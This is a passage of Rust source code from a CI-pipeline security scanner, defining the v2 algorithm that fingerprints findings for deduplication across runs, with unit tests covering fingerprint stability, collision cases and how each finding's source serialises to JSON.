/// Stability guarantee: the v2 algorithm is stable for the v0.10+ line.
/// Pre-v0.10 (v1 algorithm) suppressions DO NOT carry forward — a one-time
/// re-baselining is required when upgrading. CHANGELOG and
/// `docs/finding-fingerprint.md` flag the break explicitly.
///
/// Output: SHA-256 of the canonical input string, truncated to the first
/// 16 hex characters (64 bits — collision-resistant enough for finding
/// dedup, short enough to be human-glanceable in a SIEM table).
pub fn compute_fingerprint(finding: &Finding, graph: &AuthorityGraph) -> String {
    let rule_id = extract_custom_rule_id(&finding.message)
        .map(str::to_string)
        .unwrap_or_else(|| category_rule_id(&finding.category));

    let category = category_rule_id(&finding.category);
    let file = graph.source.file.as_str();

    // Root authority name (if any) — always emitted as its own component,
    // empty string when no Secret/Identity is involved. Distinct field so
    // a finding whose root_authority differs from a sibling's is
    // recognisably different even when the involved-node list happens to
    // overlap.
    let root_authority: String = finding
        .nodes_involved
        .iter()
        .filter_map(|id| graph.node(*id))
        .find(|n| matches!(n.kind, NodeKind::Secret | NodeKind::Identity))
        .map(|n| n.name.clone())
        .unwrap_or_default();

    // Ordered involved-node names. Order is preserved (NOT sorted) — for
    // authority_propagation findings the convention is `[source, sink]`,
    // so two findings hitting the same secret but reaching different
    // untrusted steps produce different fingerprints (the v1 collision
    // class). Empty string when no nodes are involved.
    let nodes_ordered: String = finding
        .nodes_involved
        .iter()
        .filter_map(|id| graph.node(*id))
        .map(|n| n.name.as_str())
        .collect::<Vec<_>>()
        .join(",");

    // Canonical encoding: every component prefixed with a tag and joined
    // by `\x1f` (ASCII unit separator) so component boundaries cannot
    // alias across inputs. Algorithm version baked into the prefix so a
    // future change to the contract is detectable from the canonical
    // string alone.
    let canonical = format!(
        "v2\x1frule={rule_id}\x1ffile={file}\x1fcategory={category}\x1froot={root_authority}\x1fnodes={nodes_ordered}"
    );

    let digest = Sha256::digest(canonical.as_bytes());
    let mut out = String::with_capacity(16);
    for byte in &digest[..8] {
        use std::fmt::Write;
        // 8 bytes -> 16 hex chars
        let _ = write!(&mut out, "{byte:02x}");
    }
    out
}

#[cfg(test)]
mod fingerprint_tests {
    use super::*;
    use crate::graph::{AuthorityGraph, NodeKind, PipelineSource, TrustZone};

    fn source(file: &str) -> PipelineSource {
        PipelineSource {
            file: file.to_string(),
            repo: None,
            git_ref: None,
            commit_sha: None,
        }
    }

    fn make_finding(category: FindingCategory, msg: &str, nodes: Vec<NodeId>) -> Finding {
        Finding {
            severity: Severity::High,
            category,
            path: None,
            nodes_involved: nodes,
            message: msg.to_string(),
            recommendation: Recommendation::Manual {
                action: "fix it".to_string(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        }
    }

    #[test]
    fn fingerprint_is_stable_across_repeat_calls() {
        let mut graph = AuthorityGraph::new(source(".github/workflows/ci.yml"));
        let s = graph.add_node(NodeKind::Secret, "AWS_KEY", TrustZone::FirstParty);
        let f = make_finding(
            FindingCategory::AuthorityPropagation,
            "AWS_KEY reaches third party",
            vec![s],
        );
        let a = compute_fingerprint(&f, &graph);
        let b = compute_fingerprint(&f, &graph);
        assert_eq!(a, b, "same finding must hash identically across calls");
        assert_eq!(a.len(), 16, "fingerprint is 16 hex chars");
        assert!(a.chars().all(|c| c.is_ascii_hexdigit()));
    }

    #[test]
    fn different_files_produce_different_fingerprints() {
        let mut g_a = AuthorityGraph::new(source("workflows/a.yml"));
        let mut g_b = AuthorityGraph::new(source("workflows/b.yml"));
        let s_a = g_a.add_node(NodeKind::Secret, "TOKEN", TrustZone::FirstParty);
        let s_b = g_b.add_node(NodeKind::Secret, "TOKEN", TrustZone::FirstParty);
        let f_a = make_finding(FindingCategory::UnpinnedAction, "msg", vec![s_a]);
        let f_b = make_finding(FindingCategory::UnpinnedAction, "msg", vec![s_b]);
        assert_ne!(
            compute_fingerprint(&f_a, &g_a),
            compute_fingerprint(&f_b, &g_b)
        );
    }

    #[test]
    fn different_rules_produce_different_fingerprints() {
        let mut graph = AuthorityGraph::new(source(".github/workflows/ci.yml"));
        let s = graph.add_node(NodeKind::Secret, "AWS_KEY", TrustZone::FirstParty);
        let f1 = make_finding(FindingCategory::AuthorityPropagation, "msg", vec![s]);
        let f2 = make_finding(FindingCategory::UntrustedWithAuthority, "msg", vec![s]);
        assert_ne!(
            compute_fingerprint(&f1, &graph),
            compute_fingerprint(&f2, &graph)
        );
    }

    #[test]
    fn message_changes_do_not_affect_fingerprint() {
        // The whole point of cross-run dedup: an operator can re-word
        // the message text without breaking SIEM suppressions.
        let mut graph = AuthorityGraph::new(source(".github/workflows/ci.yml"));
        let s = graph.add_node(NodeKind::Secret, "AWS_KEY", TrustZone::FirstParty);
        let f1 = make_finding(
            FindingCategory::AuthorityPropagation,
            "old phrasing of the message",
            vec![s],
        );
        let f2 = make_finding(
            FindingCategory::AuthorityPropagation,
            "completely different new phrasing",
            vec![s],
        );
        assert_eq!(
            compute_fingerprint(&f1, &graph),
            compute_fingerprint(&f2, &graph)
        );
    }

    #[test]
    fn per_hop_findings_against_same_authority_are_distinct() {
        // v2 contract: a single secret reaching N distinct untrusted steps
        // produces N distinct fingerprints. Each (secret, step) pair is its
        // own remediation-distinct finding — collapsing them (the v1
        // behaviour) hid genuinely different exposure surfaces. SIEMs that
        // want a per-secret rollup can group on root_authority client-side.
        let mut graph = AuthorityGraph::new(source(".github/workflows/ci.yml"));
        let secret = graph.add_node(NodeKind::Secret, "DEPLOY_TOKEN", TrustZone::FirstParty);
        let step_a = graph.add_node(NodeKind::Step, "deploy[0]", TrustZone::Untrusted);
        let step_b = graph.add_node(NodeKind::Step, "deploy[1]", TrustZone::Untrusted);

        let f_a = make_finding(
            FindingCategory::AuthorityPropagation,
            "DEPLOY_TOKEN reaches deploy[0]",
            vec![secret, step_a],
        );
        let f_b = make_finding(
            FindingCategory::AuthorityPropagation,
            "DEPLOY_TOKEN reaches deploy[1]",
            vec![secret, step_b],
        );
        assert_ne!(
            compute_fingerprint(&f_a, &graph),
            compute_fingerprint(&f_b, &graph),
            "per-hop findings against one secret must produce distinct \
             fingerprints — sink identity is part of the issue"
        );
    }

    #[test]
    fn same_secret_same_sink_remains_stable_across_calls() {
        // Re-running the SAME finding (same secret, same sink, same file)
        // must still produce the same fingerprint — that is the entire
        // point of cross-run dedup. The v2 change adds inputs but does not
        // introduce non-determinism.
        let mut graph = AuthorityGraph::new(source(".github/workflows/ci.yml"));
        let secret = graph.add_node(NodeKind::Secret, "DEPLOY_TOKEN", TrustZone::FirstParty);
        let step = graph.add_node(NodeKind::Step, "deploy[0]", TrustZone::Untrusted);
        let f = make_finding(
            FindingCategory::AuthorityPropagation,
            "msg",
            vec![secret, step],
        );
        assert_eq!(
            compute_fingerprint(&f, &graph),
            compute_fingerprint(&f, &graph)
        );
    }

    #[test]
    fn r2_attack2_two_files_same_secret_name_distinct_fingerprints() {
        // R2 attack #2 reproducer: two genuinely different findings in two
        // different pipeline files that share a secret NAME must produce
        // different fingerprints. The earlier (pre-v0.9.1) algorithm could
        // collide here; the v2 algorithm explicitly includes file path so
        // the names cannot alias across files.
        let mut g_a = AuthorityGraph::new(source("workflows/a.yml"));
        let mut g_b = AuthorityGraph::new(source("workflows/b.yml"));
        let s_a = g_a.add_node(NodeKind::Secret, "MY_SECRET", TrustZone::FirstParty);
        let sink_a = g_a.add_node(NodeKind::Step, "evil/action", TrustZone::Untrusted);
        let s_b = g_b.add_node(NodeKind::Secret, "MY_SECRET", TrustZone::FirstParty);
        let sink_b = g_b.add_node(
            NodeKind::Step,
            "different-evil/action",
            TrustZone::Untrusted,
        );

        let f_a = make_finding(
            FindingCategory::AuthorityPropagation,
            "MY_SECRET reaches evil/action",
            vec![s_a, sink_a],
        );
        let f_b = make_finding(
            FindingCategory::AuthorityPropagation,
            "MY_SECRET reaches different-evil/action",
            vec![s_b, sink_b],
        );
        assert_ne!(
            compute_fingerprint(&f_a, &g_a),
            compute_fingerprint(&f_b, &g_b),
            "two genuinely different findings must not share a fingerprint \
             just because the secret name overlaps"
        );
    }

    #[test]
    fn root_authority_segment_is_always_present_even_when_empty() {
        // Findings without any Secret/Identity (e.g. floating_image) MUST
        // still produce a stable fingerprint. The empty-root case is its
        // own equivalence class — two such findings with the same node
        // list collapse to the same fingerprint; differing node lists
        // produce different fingerprints.
        let mut g = AuthorityGraph::new(source(".github/workflows/ci.yml"));
        let img_a = g.add_node(NodeKind::Image, "alpine:latest", TrustZone::ThirdParty);
        let img_b = g.add_node(NodeKind::Image, "ubuntu:22.04", TrustZone::ThirdParty);
        let f_a = make_finding(FindingCategory::FloatingImage, "msg-a", vec![img_a]);
        let f_b = make_finding(FindingCategory::FloatingImage, "msg-b", vec![img_b]);
        let fp_a = compute_fingerprint(&f_a, &g);
        let fp_b = compute_fingerprint(&f_b, &g);
        assert_ne!(
            fp_a, fp_b,
            "two distinct floating-image findings must not collide"
        );
        assert_eq!(fp_a.len(), 16);
        assert_eq!(fp_b.len(), 16);
    }

    #[test]
    fn node_order_is_significant() {
        // The fingerprint preserves caller order in nodes_involved. A
        // finding emitted as [secret, step] is semantically different from
        // [step, secret] (source vs sink role) and produces a different
        // fingerprint. Rules must therefore stay consistent in the order
        // they push nodes — every built-in does today.
        let mut g = AuthorityGraph::new(source(".github/workflows/ci.yml"));
        let s = g.add_node(NodeKind::Secret, "K", TrustZone::FirstParty);
        let step = g.add_node(NodeKind::Step, "use", TrustZone::Untrusted);
        let forward = make_finding(FindingCategory::AuthorityPropagation, "x", vec![s, step]);
        let reverse = make_finding(FindingCategory::AuthorityPropagation, "x", vec![step, s]);
        assert_ne!(
            compute_fingerprint(&forward, &g),
            compute_fingerprint(&reverse, &g),
            "node order must influence the fingerprint so role swap is detectable"
        );
    }

    #[test]
    fn custom_rule_id_in_message_is_used() {
        // Custom rules carry id in `[id] message` prefix; fingerprint
        // must key on the custom id, not the category fallback.
        let mut graph = AuthorityGraph::new(source(".github/workflows/ci.yml"));
        let s = graph.add_node(NodeKind::Secret, "X", TrustZone::FirstParty);
        let f_custom = make_finding(
            FindingCategory::UnpinnedAction,
            "[my_custom_rule] something happened",
            vec![s],
        );
        let f_plain = make_finding(FindingCategory::UnpinnedAction, "no prefix here", vec![s]);
        assert_ne!(
            compute_fingerprint(&f_custom, &graph),
            compute_fingerprint(&f_plain, &graph),
            "custom rule id must distinguish from category fallback"
        );
    }

    #[test]
    fn finding_group_id_is_deterministic_uuid_v5() {
        // Same fingerprint -> same group id, byte-identical.
        let g1 = compute_finding_group_id("5edb30f4db3b5fa3");
        let g2 = compute_finding_group_id("5edb30f4db3b5fa3");
        assert_eq!(g1, g2);
        // UUID v5 shape: 8-4-4-4-12 hex chars with version=5 nibble.
        assert_eq!(g1.len(), 36);
        // Position 14 is the version nibble — must be '5' for v5.
        assert_eq!(
            g1.chars().nth(14),
            Some('5'),
            "expected v5 marker, got {g1}"
        );
        // Position 19 is the variant nibble — must be one of 8/9/a/b.
        let variant = g1.chars().nth(19).unwrap();
        assert!(
            matches!(variant, '8' | '9' | 'a' | 'b'),
            "expected RFC 4122 variant, got {variant}"
        );
        // Different fingerprint -> different group id.
        assert_ne!(g1, compute_finding_group_id("a3c8d9e1f2b4c5d6"));
    }

    #[test]
    fn with_time_to_fix_attaches_effort() {
        let mut graph = AuthorityGraph::new(source(".github/workflows/ci.yml"));
        let s = graph.add_node(NodeKind::Secret, "X", TrustZone::FirstParty);
        let f = make_finding(FindingCategory::UnpinnedAction, "msg", vec![s])
            .with_time_to_fix(FixEffort::Trivial);
        assert_eq!(f.extras.time_to_fix, Some(FixEffort::Trivial));
    }

    #[test]
    fn with_compensating_control_downgrades_and_records_original() {
        let mut graph = AuthorityGraph::new(source(".github/workflows/ci.yml"));
        let s = graph.add_node(NodeKind::Secret, "X", TrustZone::FirstParty);
        let f = make_finding(FindingCategory::TriggerContextMismatch, "msg", vec![s])
            .with_compensating_control("fork check present");
        // Default High in make_finding -> downgraded to Medium.
        assert_eq!(f.severity, Severity::Medium);
        assert_eq!(f.extras.original_severity, Some(Severity::High));
        assert_eq!(f.extras.compensating_controls.len(), 1);
    }

    #[test]
    fn empty_node_list_still_produces_fingerprint() {
        // Categories like authority_cycle, floating_image, unpinned_action
        // may not carry an authority node — fingerprint must still work.
        let graph = AuthorityGraph::new(source(".github/workflows/ci.yml"));
        let f = make_finding(FindingCategory::UnpinnedAction, "no nodes here", vec![]);
        let fp = compute_fingerprint(&f, &graph);
        assert_eq!(fp.len(), 16);
        assert!(fp.chars().all(|c| c.is_ascii_hexdigit()));
    }
}

#[cfg(test)]
mod source_tests {
    use super::*;

    #[test]
    fn built_in_serializes_as_string() {
        let s = FindingSource::BuiltIn;
        let v = serde_json::to_value(&s).unwrap();
        assert_eq!(v, serde_json::json!("built-in"));
    }

    #[test]
    fn custom_serializes_with_path_payload() {
        let s = FindingSource::Custom {
            source_file: PathBuf::from("/policies/no_prod_pat.yml"),
        };
        let v = serde_json::to_value(&s).unwrap();
        assert_eq!(
            v,
            serde_json::json!({"custom": {"source_file": "/policies/no_prod_pat.yml"}})
        );
    }

    #[test]
    fn finding_round_trip_preserves_built_in_source() {
        let f = Finding {
            severity: Severity::High,
            category: FindingCategory::AuthorityPropagation,
            path: None,
            nodes_involved: vec![],
            message: "x".into(),
            recommendation: Recommendation::Manual {
                action: "fix".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        };
        let s = serde_json::to_string(&f).unwrap();
        // Encoded as the literal `"source":"built-in"` — operators eyeballing
        // raw JSON immediately see "this is a shipped rule".
        assert!(
            s.contains("\"source\":\"built-in\""),
            "built-in source must serialise as \"built-in\": {s}"
        );
        let f2: Finding = serde_json::from_str(&s).unwrap();
        assert_eq!(f2.source, FindingSource::BuiltIn);
    }

    #[test]
    fn finding_round_trip_preserves_custom_source_with_path() {
        let path = PathBuf::from("/work/invariants/no_prod_pat.yml");
        let f = Finding {
            severity: Severity::Critical,
            category: FindingCategory::AuthorityPropagation,
            path: None,
            nodes_involved: vec![],
            message: "[no_prod_pat] hit".into(),
            recommendation: Recommendation::Manual {
                action: "fix".into(),
            },
            source: FindingSource::Custom {
                source_file: path.clone(),
            },
            extras: FindingExtras::default(),
        };
        let s = serde_json::to_string(&f).unwrap();
        assert!(
            s.contains("\"custom\""),
            "custom source must serialise with `custom` key: {s}"
        );
        assert!(
            s.contains("/work/invariants/no_prod_pat.yml"),
            "custom source must include the loader path: {s}"
        );
        let f2: Finding = serde_json::from_str(&s).unwrap();
        assert_eq!(
            f2.source,
            FindingSource::Custom { source_file: path },
            "round-trip must preserve custom source path"
        );
    }

    #[test]
    fn missing_source_field_deserializes_as_built_in() {
        // Backward-compat: pre-provenance JSON omits the field entirely; the
        // serde default makes it `BuiltIn`. Without this, every old
        // suppression DB would fail to parse on upgrade.
        let json = r#"{
            "severity": "high",
            "category": "authority_propagation",
            "nodes_involved": [],
            "message": "old-format finding",
            "recommendation": {"type": "manual", "action": "review"}
        }"#;
        let f: Finding = serde_json::from_str(json).expect("legacy JSON must parse");
        assert_eq!(f.source, FindingSource::BuiltIn);
    }
}
